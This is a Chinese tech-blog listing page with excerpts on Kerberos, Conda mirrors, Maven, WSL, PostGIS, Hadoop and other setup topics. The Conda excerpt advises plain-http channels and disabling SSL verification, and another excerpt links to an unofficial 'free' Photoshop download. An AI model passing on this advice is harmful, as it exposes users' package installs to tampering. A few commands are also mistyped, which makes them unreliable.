Ticket：一个票据，客户用它来向服务器证明自己的身份，包括服务的主体名称、用户的主体名称、用户主机的ip地址、时间标记、会话密钥、定义票证生命周期的时间戳。 keytab：keytab是包含principals和加密principal key的文件。keytab文件对于每个host是唯一的，key中包含hostname。keytab文件用于不需要人工交互和保存纯文本密码，实现到kerberos上验证一个主机上的principal。 实验环境 操作系统：Centos 7.4 操作用户：root 软件角色分布如下： 设置 /etc/hosts文件 首先进入root模式 输入"su root" 复制资源机密码进入root模式 输入"vim /etc/hosts"，配置节点IP和机器名 复制ECS-2的IP和机器名到ECS-1的hosts配置文件中（ECS-2的hosts文件同样如此设置） 实验步骤 1.kerberos安装 1.1安装kerberos 服务器端： # yum -y install krb5-libs krb5-workstation krb5-server 客户端： # yum -y install krb5-libs krb5-workstation 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5026fc44757f6ec4bb2a3e495aad243/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfe80facaf8eb4a77ce5b9ac439ad1cf/" rel="bookmark">
			解决方法集合CondaHTTPError:HTTP 000 CONNECTION FAILED for url＜https://mirrors.tuna.tsinghua.edu.cn/anaco
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
背景
解决方案
主要原因：配置没配对
方法A：在cmd输入
方法B：修改.condarc（运行期配置文件）​​​​​​
其他原因
原因A：开了代理或者VPN
原因B：没有关防火墙等安全管家
原因C：镜像地址无法访问
原因D：镜像源加上系统
原因E：内网连接的服务器不能访问外网
conda config相关指令格式
查看conda config
添加channel
删除channel
删除default
tips：pip镜像源下载包
暂时设置镜像源
永久设置镜像源下载
背景 因为默认源下载速度较慢，所以更换镜像源。
以清华源为例Index of /anaconda/pkgs/main/ | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror
解决方案 主要原因：配置没配对 方法A：在cmd输入 （删除 ”- default“（可选）） conda config --remove channels defaults （添加镜像源，注意是http，而非https，因为https有时候会出现连接错误的问题，改成http后不会再出现此类问题。） conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/ conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/ （在设置中显示以上镜像源） conda config --set show_channel_urls yes （关掉验证，对于http来说，走的是明文传输，不加密的，就不需要验证，其中信息的加密方式为SSL） conda config --set ssl_verify false 如果不成功可以试试方法B
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfe80facaf8eb4a77ce5b9ac439ad1cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33c7f927baef32fd3d08eb32981b19d4/" rel="bookmark">
			Java中文件相对路径和绝对路径的用法(IO同样适用),系统找不到指定文件的解决办法讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引入场景：在我们日常开发中，经常需要去读取文件的内容，但经常出现文件未发现的问题，如下图： 出现这个问题的原因就有二个，第一是文件真的不存在，第二就是文件明明存在却无法找到，这就是我们的路径写错了。
相对路径和绝对路径的区别： 绝对路径：在不同的系统中，绝对路径的写法是不同的，在windows系统中绝对路径是已盘符为起点的，而在linux系统中绝对路径的起点是根目录
相对路径：就是相对于某个条件的路径
案例：
windows系统: 绝对路径： c:/java/hello.java
表示：在C盘下的java文件夹中的hello.java文件
linux系统：
绝对路径：/home/java/hello.java
表示：根目录下的家目录下的java文件夹中的hello.java文件
Java项目中文件相对路径：
在java项目中的相对路径的写法：src+具体路径 在Java项目中，只要你的文件是在src目录下
列如：读取src目录下的images文件夹中的tank.txt文件
写法1：FileInputStream file = new FileInputStream("src/images/tank.txt");
写法2：FileInputStream file = new FileInputStream("src\\images\\tank.txt");
这二个的写法项目是一样的
如图：
在module中文件相对路劲的写法：模块名+src+文件的具体路径
写法：FileInputStream file = new FileInputStream("test\\src\\test.txt");
读取其他模块中的文件：模块名+src+具体路径
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20779af9069f5bdc5a4d1a4666cdcf04/" rel="bookmark">
			解决Photoshop CS6在window10中窗口字体太小问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导读： 之前一直使用的是win7系统（1920X1080分辩率），最新更换了新电脑主机和显示器，使用的是window10系统（3840X2160分辩率），安装永久免费版的Photoshop CS6，打开时发现界面字体非常小，如下图：
基本看不清楚字，我的第一个想法是升级Photoshop，升级后发现是收费的（只能试用7天），百度搜索了半天，没找到任何可以免费的版本，很多宣传免费的，最后都是要你先付钱才能下载安装。无奈，只能继续研究win10如何修改Photoshop CS6显示的字体大小，最终功夫不负有心人，在多番尝试下，找到了最正确的解决方法。
永久免费Photoshop CS6下载地址：https://zy13.net/thread-778-1-1.html
解决方案： 1、在电脑上鼠标右击Photoshop CS6桌面图标，选择“属性” → “兼容性” →“更改高DPI设置”
2、勾选“替代高DPI缩放行为”，缩放执行选择 “系统”，如果"系统"还是不行，你可以选择“系统（增强）”，点击“确定”
3、点击“确定”后，再点击“应用”，重新打开Photoshop CS6软件，字体完美承现，如下图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca99df036ce6a0e0659708965862d306/" rel="bookmark">
			Maven详细总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考博客：https://blog.csdn.net/xiaodi2016/article/details/121341063
※注意：
我们自己的Maven工程必须执行安装操作才会进入仓库。安装的命令是：mvn install
任何一个Maven工程会根据坐标到本地仓库中去查找它所依赖的jar包。如果能够找到则可以正常工作，否则就不行。HelloFriend 回到本地仓库去找HelloWorld jar包。
4.5 依赖管理
当A jar包需要用到B jar包中的类时，我们就说A对B有依赖。
直接依赖和间接依赖
如果A依赖B，B依赖C，那么A→B和B→C都是直接依赖，而A→C是间接依赖。
4.5.1 依赖的范围
依赖的范围：类似于变量的作用域，jar包可以使用的范围
&lt;scope&gt;&lt;/scope&gt;指明依赖范围
compile：
默认值，可以使用在main目录与test目录下使用
部署到Tomcat服务器上运行时要放在WEB-INF的lib目录下
test：
只能在test目录下使用
部署时无需上传服务器，服务器上没有是没有问题的
provided：
可以使用在main目录与test目录下使用
部署时无需上传服务器，因为服务器上理论上是已经存在的了(假定)
4.5.2 依赖的传递性
当存在间接依赖的情况时，主工程对间接依赖的jar可以访问吗？这要看间接依赖的jar包引入时的依赖范围——只有依赖范围为compile时可以访问。
间接依赖是否可以用还需要看依赖的范围，只有是complie才可以间接依赖。
原则：最短路径者优先和先声明者优先
如果可以不去依赖某个工程的jar包可以使用&lt;exclusion&gt;标签
&lt;exclusions&gt;
&lt;exclusion&gt;
&lt;groupId&gt;junit&lt;/groupId&gt;
&lt;artifactId&gt;junit&lt;/artifactId&gt;
&lt;/exclusion&gt;
&lt;/exclusions&gt;
4.5.3 统一管理目标Jar包的版本
以对Spring的jar包依赖为例：Spring的每一个版本中都包含spring-context，springmvc等jar包。我们应该导入版本一致的Spring jar包，而不是使用4.0.0的spring-context的同时使用4.1.1的springmvc。
问题是如果我们想要将这些jar包的版本统一升级为4.1.1，显然，我们有统一配置的方式：
4.6:仓库：
（1）本地仓库：为当前本机电脑上的所有Maven工程服务。
（2）远程仓库
a）私服：架设在当前局域网环境下，为当前局域网范围内的所有Maven工程服务。 b）中央仓库：架设在Internet上，为全世界所有Maven工程服务。 c）中央仓库的镜像：架设在各个大洲，为中央仓库分担流量。减轻中央仓库的压力，同时更快的响应用户请求。 4.6.3：仓库中的文件
（1）Maven的插件
（2）我们自己开发的项目的模块
（3）第三方框架或工具的jar包
不管是什么样的jar包，在仓库中都是按照坐标生成目录结构，所以可以通过统一的方式查询或依赖。
4.7:maven生命周期
Maven生命周期定义了各个构建环节的执行顺序，有了这个清单，Maven就可以自动化的执行构建命令了。
Clean Lifecycle在进行真正的构建之前进行一些清理工作。
Default Lifecycle构建的核心部分，编译，测试，打包，安装，部署等等。(用的比较多，可以帮助我们自动化构建我们需要的内容)
Site Lifecycle生成项目报告，站点，发布站点。(在浏览器上查看项目的信息，是site阶段和site-deploy阶段，用以生成和发布Maven站点，这可是Maven相当强大的功能，文档及统计数据自动生成，但是一般我们用不上)
4.7.1：生命周期与自动化构建
运行任何一个阶段的时候，它前面的所有阶段都会被运行，例如我们运行mvn install 的时候，代码会被编译，测试，打包。这就是Maven为什么能够自动执行构建过程的各个环节的原因。此外，Maven的插件机制是完全依赖Maven的生命周期的。
4.8：插件和目标
（1）Maven的核心仅仅定义了抽象的生命周期，具体的任务都是交由插件完成的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca99df036ce6a0e0659708965862d306/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad35b639bbaf9862409887eef564c015/" rel="bookmark">
			wsl-系统迁移-非系统盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WSL通过Windows Store进行安装的，系统文件默认安装到C盘。在使用过程中，WSL占用C盘一是容易让windows系统盘饱满，二是重装系统的话wsl的资料也会丢失，三是非C盘的空间在docker空间中挂载很是麻烦。
出于以上三个原因我将wsl迁移到非C盘的地方。
1、打开CMD，查看所有WSL。
指令：wsl -l -v
显示：
Windows Subsystem for Linux Distributions:
Ubuntu-20.04 (Default)
2、导出WSL。
指令：wsl --export Ubuntu-20.04 D:\wsl\ubuntu20.04.tar
3、注销原WSL。
指令：wsl --unregister Ubuntu-20.04
4、在导入WSL系统镜像。
指令：wsl --import Ubuntu-20.04 D:\wsl D:\wsl\ubuntu20.04.tar --version 2
执行不成功的话就去掉--version 2
【重要】
命令格式：wsl --import &lt;DistributionName&gt; &lt;安装位置&gt; &lt;tar文件名&gt;
导入时改变DistributionName(如Ubuntu-20.04改成Ubuntu)，会导致WSL不可用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a86adfd290a564dde20a46904e36373/" rel="bookmark">
			超融合时序数据库YMatrixDB与PostGIS案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是PostGIS
PostGIS的特点
PostGIS 基础知识
OGC的WKB和WKT格式
插入数据实例
EWKT、EWKB和Canonical格式
插入数据实例
SQL-MM格式
常几何类型和函数
常用操作符
常用操作函数
OGC标准函数
管理函数
几何对象关系函数
几何对象处理函数
几何对象存取函数
类型转换函数
PostGIS 系统表查看
spatial_ref_sys表
geometry_columns表
PostGIS 两个重要的坐标体系
YMatrixDB 安装PostGIS
PostGIS 安装
在YMatrixDB上安装postgis扩展
YMatrixDB的PostGIS使用案例
计算两点之间的距离
范围内的点查找
弯曲的几何实体案例
YMatrixDB的PostGIS车联网数据案例
车联网数据下载
表创建
数据加载
数据处理
出租车数据分析
出租车行程统计
费率分布
机场行程分析
附近出租车
YMatrix适用于各种规模设备的数据融合与物联网时序应用场景，本案例以具体的案例来说明YMatrix在PostGIS中的数据加载、处理和分析的能力以及时空数据的具体使用方法，首先我们先了解下PostGIS，然后再分享几个PostGIS在YMatrixDB的案例。
什么是PostGIS PostGIS是一个空间数据库，空间数据库像存储和操作数据库中其他任何对象一样去存储和操作空间对象。空间数据库将空间数据和对象关系数据库（Object Relational database）完全集成在一起。实现从以GIS为中心向以数据库为中心的转变。PostGIS 实现了点、线、面、多点、多线、多面等的SQL实现参考。
PostGIS的特点 PostGIS 具有强大的功能，具有以下的特点PostGIS支持空间数据类型，包括点（POINT）、线（LINESTRING）、面（POLYGON）、多点 （MULTIPOINT）、多线（MULTILINESTRING）、多面（MULTIPOLYGON）和几何集合 （GEOMETRYCOLLECTION）等。支持对象表达方法，比如WKT和WKB。提供简单的空间分析函数，同时也提供其他一些具有复杂分析功能的函数。支持所有的数据存取和构造方法，如GeomFromText()、AsBinary()，以及GeometryN()等。对于元数据的支持，如GEOMETRY_COLUMNS和SPATIAL_REF_SYS。同时也支持AddGeometryColumn和DropGeometryColumn函数等。能对矢量数据和栅格数据做处理，能通过 SQL 调用栅格、矢量数据的投影函数。能通过多种工具导入多种标准的栅格数据，同时能通过 SQL 语句将栅格渲染至各种格式GeoTiff、PNG、JPG、NetCDF 等。能通过 SQL 调用 KML、GML、GeoJSON、GeoHash、WKT 等标准文本类型的矢量数据的函数。矢量或栅格操作函数，包括按区域伸缩栅格像元值、局域统计、按矢量图形裁剪栅格、矢量化栅格等。 PostGIS 基础知识 OGC的WKB和WKT格式 OGC定义了两种描述几何对象的格式，分别是WKB（Well-Known Binary）和WKT（Well-Known Text）格式。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a86adfd290a564dde20a46904e36373/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83270eb5643227f0a28d2d51fcd992c5/" rel="bookmark">
			机器学习笔记之概率图模型(五)马尔可夫随机场的结构表示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器学习笔记之概率图模型——马尔可夫随机场 引言回顾：贝叶斯网络与条件独立性马尔可夫随机场与条件独立性全局马尔可夫性(Global Markov Property)局部马尔可夫性(Local Markov Property)成对马尔可夫性(Pairwise Markov Property) 马尔可夫随机场的因子分解概念介绍：团、势函数关于马尔可夫随机场因子分解的证明马尔可夫毯 引言 前面部分介绍了贝叶斯网络的结构表示以及贝叶斯网络相关的概率图模型。本节将介绍马尔可夫随机场(Markov Random Field)的 结构表示(Representation)。
回顾：贝叶斯网络与条件独立性 基于贝叶斯网络(有向图)，样本集合 X \mathcal X X各维度信息的联合概率分布 表示如下：
P ( X ) = ( x 1 , ⋯ , x p ) = ∏ i = 1 p P ( x i ∣ x p a ( i ) ) \mathcal P(\mathcal X) = \mathcal (x_1,\cdots,x_p) = \prod _{i=1}^p \mathcal P(x_i \mid x_{pa(i)}) P(X)=(x1​,⋯,xp​)=i=1∏p​P(xi​∣xpa(i)​)
其中 x p a ( i ) x_{pa(i)} xpa(i)​表示结点 x i x_i xi​的父结点。基于该式，贝叶斯网络中包含 三种变量之间的典型依赖关系：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83270eb5643227f0a28d2d51fcd992c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b092dd0832ac045a70ca3cbc605d77d3/" rel="bookmark">
			【intent-filter】AndroidManifest中＜intent-filter＞标签的 部分作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里写自定义目录标题 AndroidManifest.xmlIntent-filter 标签Intent-filter 标签中的常用元素Intent-filter 标签的作用Intent对象Intent显式启动活动窗口Intent隐式启动（重要） AndroidManifest.xml AndroidManifest.xml是安卓开发中主配置文件，程序执行首当浏览这个文件的内容
Intent-filter 标签 intent-filter是一个过滤器标签，有过滤的功能，这里的过滤可以理解为筛选
即 筛选intent-filter标签内的元素 作为比对 对象
Intent-filter 标签中的常用元素 只探讨两个常用元素
标签
标签
Intent-filter 标签的作用 他的作用是给 安卓系统 提供过滤准则
当系统得到启动意图时，会遍历注册文件中的各个Intent-filter标签中的内容，从而起到赛选作用，当有符合 启动意图 的过滤准则的activity时，把他放到启动列表中，当出现多个符合activity时，由用户选择启动对象。
Intent对象 Inten对象中也有对应的属性action和category属性
Intent对象可以用来显式启动一个活动窗口，也可以隐式启动一个活动窗口
Intent显式启动活动窗口 直接使用指定的activity类进行启动
首先现在清单注册这个窗口
然后在代码中如此写到
就能直接定位到NoteEditor启动类了
Intent隐式启动（重要） 为什么要用隐式启动？
因为隐式启动不指明启动窗口，不锁死启动窗口，更加自由
隐式启动是由系统来筛选启动窗口的，有时候能筛选出多个启动窗口
好比用户想打开一个.txt文件，有很多应用程序可以打开，比如 掌阅app，比如wps app，比如QQ浏览器app，这时候可以使用某种规则，做成隐式启动，表达这几个app都可以用来启动.txt文件，当打开.txt文件的时候，用户就可以自己选择想要的程序来启动文件了。
也就是说，隐式启动把一群具备同样意图的程序筛选出来放到一起，当用户启动这个意图的时候，可以展示出相应的程序集合，供用户筛选。
实现隐式启动——
首先在AndroidMenifest.xml中注册action
给另一个窗口也注册相同的action
然后在主页活动类这样写
点击按钮触发事件，就能实现隐式启动功能了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f681223212838c30ddfa10ecdc23b04d/" rel="bookmark">
			zookeeper hub.docker官方镜像使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #下载hub.docker官方镜像 docker pull zookeeper #--restart always 自动重启 #--name zookeeper 设置容器名 #-p 2181:2181主机端口与容器端口映射，不设置无法使用 #-p 8081:8080主机端口8081与容器端口8080映射。本机8080端口已被其他服务占用。 docer run --restart always --name zookeeper -p 2181:2181 -p 8081:8080 -p zookeeper 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80ff16e299fdf07fa2716cd925c3b204/" rel="bookmark">
			Entity Framework开发方式-DBFirst
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇文章主要是介绍一下Entity Framework三种开发方式中的Datebase First（简称DBFirst），感兴趣的可以参考一下，如果写的有什么不对的，欢迎指正
一、DBFirst说明 Database First模式通常被叫做数据库优先的开发方式，前提是已经有了相应的数据库了，可以使用EF设计工具由数据库生成数据模型类,也可以使用Visual Studio模型设计器修改这些模型之间对应关系。在已有数据库的情况下，此模式还是比较方便的。
二、使用创建说明 1.先创建一个控制台程序，然后在项目上鼠标右键选择添加项目-&gt;数据-&gt;ADO.NET 实体数据模型，然后修改对应的实体的名称，点击添加。
2.点击完添加后，会跳出实体数据库模型导向，选择来自数据库的EF设计器，然后点击下一步
3.在弹出的界面点击新建连接，会跳出连接属性，然后输入自己的服务器名，在身份验证处，可以选择SQL Server 身份验证，也可以windows验证等，根据自己的需要选择，然后下方选择需要导入的数据库，都选择好后，可以点击测试连接，会跳出测试连接成功。然后点击确定，然后修改名称，点击下一步.
4.选择好对应的框架版本后，需要选择对应的数据库对象，DBFirst支持导入表，视图，存储过程和函数，这里暂时先只用到了表，就先只选择表。然后点击完成，生成的过程中需要一定的时间等待
5.然后项目中会有一个.edmx的文件，文件的结构如下图。
1）StudentModel.Context.tt （上下文）里面的cs文件放了所有的类的集合，继承自DbContext
2).StudentModel.edmx文件，是一个可视化的表设计器
3).StudentModel.tt 这里面存放了表所映射的实体类
6.在代码中访问上下文进行操作
1）首先查看一下数据库中的数据，目前存在4条
2.先进行查询操作
using (StudentEntities context = new StudentEntities()) { var stu = context.Student.FirstOrDefault(n =&gt; n.ID == 1);//查找ID为1的学生，并输出学号和姓名 Console.WriteLine("studentID:" + stu.StudentID + ",name:" + stu.StudentName); var stu1 = context.Student.FirstOrDefault(n =&gt; n.StudentName == "测试");//查找学生姓名为张三的学生 Console.WriteLine("studentID1:" + stu1.StudentID + ",name:" + stu1.StudentName); var stu2 = context.Student.Find(2);//查找ID为2的学生，find是主键查找 Console.WriteLine("studentID2:" + stu2.StudentID + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80ff16e299fdf07fa2716cd925c3b204/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98313f5cf31447b87bca620b311dd640/" rel="bookmark">
			9.HTTP协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通信有三要素，分别是通信的主体(通信的双方是谁)，通信的内容，通信的方式(打电话，写信这种)|
通信协议是通信双方完成通信所必须遵守的规则和约定
网页内容叫做超文本(HyperText)，网页内容的传输协议叫做超文本传输协议(HyperText Transfer Protocol),这四个大写字母合起来是超文本传输协议的简称HTTP
HTTP协议采用了 请求/响应 的交互模型。客户端给服务端发HTTP请求，服务端给客户端发HTTP响应。
关于HTTP的详细信息可以查阅文档 HTTP | MDN
目录
1 HTTP请求消息
1.1 请求行
1.2 请求头
1.3 空行
1.4 请求体
2 HTTP响应消息
2.1 状态行
2.2 响应头
2.3 空行
2.4 响应体
3 HTTP请求方法
4 HTTP响应状态码
1 HTTP请求消息 客户端发送到服务器的消息叫做HTTP请求消息(也叫HTTP请求报文)
HTTP请求消息由 请求行(request line)、请求头部(header)、空行和请求体 4个部分组成
1.1 请求行 请求行由 请求方式、URL和HTTP协议版本 3个部分组成，他们之间使用空格隔开
发起请求后点击Network，找到请求的内容，找到Request Headers，之后点击View source
就可以看到请求行了
post也是这三部分构成，你可以搞一个按钮，按钮绑上发POST请求的方法，点一下就能看见POST请求的状况了
1.2 请求头 请求头用于描述客户端的基本信息，比如
User-Agent 当前用的是什么类型的浏览器Content-Type 发送到服务器的数据格式Accept 客户端能够接收什么类型的返回内容Accept-Language 客户端期望接收那种人类语言的文本内容(英语汉语这种) 请求头由多行键值对组成，每一个键值对都独占一行
视频中提供了一些常用的请求字段信息
在浏览器中可以直接看到Request Headers，除了请求行外剩下的是请求头
1.3 空行 最后一个请求头字段的后面是一个空行，通知服务器请求头部至此结束。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98313f5cf31447b87bca620b311dd640/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bfc155e0232b63f63d13170700a7165/" rel="bookmark">
			hive语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 hsql语法分析 1. where 条件为查询结果且不唯一 1. where 条件为查询结果且不唯一 用 in 连接
select name,company from reader where reader_id in ( select min(reader_id) from borrow_log group by reader_id having count(1) &gt;=2 ); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efb0b737022ebbf164192360addc1d10/" rel="bookmark">
			输入n个整数，分别统计输出正数、负数的个数。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include &lt;stdio.h&gt; int main(){ int n; int count1=0; int count2=0; while(scanf("%d",&amp;n)!=EOF){ if(n&gt;0){ count1++; } else{ count2++; } } printf("positive:%d\n",count1); printf("negative:%d",count2); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/395dbd6ec4535f64ff89f5c81165e441/" rel="bookmark">
			python通过request上传多文件以及flask接收多文件的处理方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求描述：使用python 的reqeust方法，发送多文件以及，另外的flask如何接收多文件的传参和获取参数方式。
网上查了一堆资料，没有很明确或是比较清晰说明的。
使用request通过form data方式来发送多文件，参数如何处理？
方式1 #all_img_list 是文件夹地址，内部放置的是多图片。 files_list = [] for item in all_img_list: old_file_name = item.replace('\\', '/').split('/')[-1] # t = {'file': open(file_path, 'rb')} # 默认文件名称是file t = ("images", (old_file_name, open(item, 'rb').read())) files_list.append(t) # print('files_list==', files_list) result = requests.post('http://10.0.0.1:5000/api/upload', files=files_list).json() 重点：files_list ：
[(“images”, (文件名1, open(item, ‘rb’).read())), (“images”, (文件名2, open(item, ‘rb’).read())), …
]
这里是 images ，后面getlist参数就是这个。
在flask如何接收：
class demo(Resource): def post(self): # upload_file = request.files.get('file') # 只能单图存取 # 方式1 image_files = request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/395dbd6ec4535f64ff89f5c81165e441/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/226e6c052c38def218cc33441bdf7641/" rel="bookmark">
			Web3.0 的特点及你一定要学会的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是Web3.0
Web 3.0是一个读、写和拥有的时代，区别于Web1.0和Web2.0，用户创造的数字内容，所有权归用户所有，不依赖中心化平台。
Web 3.0的一个重要核心，即去中心化，Web3.0是以区块链为底层技术支撑的互联网演变方向，我们统称为价值互联网。
简单的说价值互联网就是我们的资产，我们的价值，都存在于互联网上。但这个互联网不是传统的互联网，而是区块链互联网，价值体现就是数字资产。
所以当你听到 Web 3.0的时候，通常也会提及加密货币（例如ETH 以太坊），这是因为加密货币在这些协议中发挥了很大作用。 加密货币为任何想参与创建、管理、贡献或改进其中一个项目的人提供了经济激励（以代币的方式），代币可以激励开发者们、网络参与者们共建一个更稳定和安全的Web 3.0去中心化网络。
身份识别在 Web3.0 中是如何运作的
在 Web3.0 中，身份识别的运作方式也与我们今天的习惯大不相同。在 Web3.0应用程序中，大多数时候身份将与参与互动的用户的钱包地址相关联。
不像 Web2.0 的认证方法，需要电子邮件+密码，或者国内的微信扫码登录。
如果用户选择在多个 DApp 中使用同一个钱包，他们的身份也可以在不同的应用中无缝转移。
DID （去中心化身份、链上身份）是基于区块链技术的身份凭证，由个人掌握。也是当下的热门赛道，演化出很多应用场景。
Web3.0 你一定要学会的应用
1、MetaMask （小狐狸钱包）
在 Web3.0 中，像 MetaMask 这样的加密货币钱包，将简单、匿名和安全的国际支付和交易整合到 Web3.0 原生应用中。
2、数字货币交易所
数字货币交易所是指进行数字货币间、数字货币与法币间交易撮合的平台，是加密数字货币交易流通和价格确定的主要场所，知名的数字货币交易所有币安，欧易，coinbase等
3、OpenSea
Opensea是全球最大 NFT 交易平台。 是一个点对点平台，用户可以在这里创建、交易、购买和销售NFT。
4、DAPP浏览器
DAPP浏览器与传统浏览器相比，它需要结合或者内嵌在数字钱包中（比如TP钱包），才能为用户提供与DAPP交互的入口。而传统浏览器无论是在PC时代，还是在移动互联网时代，都是一个独立的流量入口。
5、非小号APP
非小号app是中国大陆区块链行业起步最早的数字货币行情分析平台之一，致力于打造中立，权威，公正的区块链行业排行榜。通过虚拟币实时行情，行业资讯，项目深度拆解，区块链社区等不同维度，提供一站式、全方位的区块链内容以及数据挖掘服务。并且用严谨，科学的算法，从海量交易所行情信息中萃取信息。
6、ENS域名查询注册
ENS即以太坊名称服务（Ethereum Name Service) ，是一个基于以太坊区块链的分布式、开放和可扩展的命名系统，浏览器打开 ENS 域名注册网站 https://app.ens.domains/ ，页面左上角连接钱包，页面中央文本框内输入希望注册的名称。
7、区块链浏览器
例如OKLink(欧科云链)，是国际领先的多币种区块链浏览器，提供比特币、以太坊、莱特币等数据信息查询，出块查询以及比特币(btc)减半，以太坊(eth)燃烧总量查询等
8、element
Element Marke 作为 NFT 聚合交易市场， 实现了多个市场的整合。用户通过Element Market 进行挂单卖出，除了在Element Market上显示之外，还可以在OpenSea和LooksRare上展示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/297a6d7ad7d3be1b0f015d7be1a281db/" rel="bookmark">
			Centos8中Hadoop3.3.1安装详细过程（含图文）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 Hadoop介绍：
一、创建hadoop用户
二、安装SSH、配置SSH无密码登录
三、卸载jdk环境
四、安装新的java版本
五、安装 Hadoop 3
六、配置hadoop环境变量
七、Hadoop伪分布式配置
1、Hadoop 环境变量设置
2、Hadoop 配置文件的修改
（1）修改配置文件 core-site.xml
（2）修改配置文件 hdfs-site.xml：
（3）修改配置文件 hadoop-env.sh
（4）配置 mapred-site.xml
（5）配置yarn-site.xml
（6）进入前面创建的data对hdfs namenode初始化
（7）启动hadoop 使用“ start-dfs.sh ”开启 NaneNode 和 DataNode 守护进程
（8）使用“ start-yarn.sh ”开启 ResourceManager 和 NodeManager 守护进程
Hadoop介绍： Hadoop的核心由3个部分组成：
HDFS: Hadoop Distributed File System，分布式文件系统，hdfs还可以再细分为NameNode、SecondaryNameNode、DataNode。
YARN: Yet Another Resource Negotiator，资源管理调度系统
Mapreduce：分布式运算框架
下面介绍安装 Hadoop
虚拟机： VMware 环境： Linux 系统 centos8 hadoop： hadoop-3.3.1 ​​​​​​​ 一、创建hadoop用户 VM上安装centos8的主机，设置初始内存为2G，硬盘为50G，安装成功后新建用户hadoop，设置hadoop的密码并授予hadoop用户sudo权限(不过后面主要还是用root操作)
如果你安装 CentOS 的时候不是用的 “hadoop” 用户，那么需要增加一个名为 hadoop 的用户。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/297a6d7ad7d3be1b0f015d7be1a281db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68b442078129563d7d1cbf61271a596e/" rel="bookmark">
			电脑黑屏按什么键恢复？只需要3个键就可以解决黑屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天和大家聊一聊电脑黑屏这个问题。相信大家都遇到过电脑黑屏，但是却不知道该如何解决，今天就来给大家分享一些处理方法。如果是电脑黑屏的话，一般情况下，只需要三个键就可以解决问题，电脑黑屏按什么键恢复？一起来看看是哪几个键吧！
操作环境：
演示机型：Dell optiplex 7050 系统版本：Windows 10 一、电脑黑屏的主要原因 使用【Ctrl+Alt+Delete】一直没反应，笔记本为什么开机后黑屏？来看看下面主要的4个原因及解决办法：
1、电脑意外删除或者损坏了系统文件。这时需要您重新安装系统；
2、磁盘问题。需要检查磁盘，如果有问题，可以更换它；
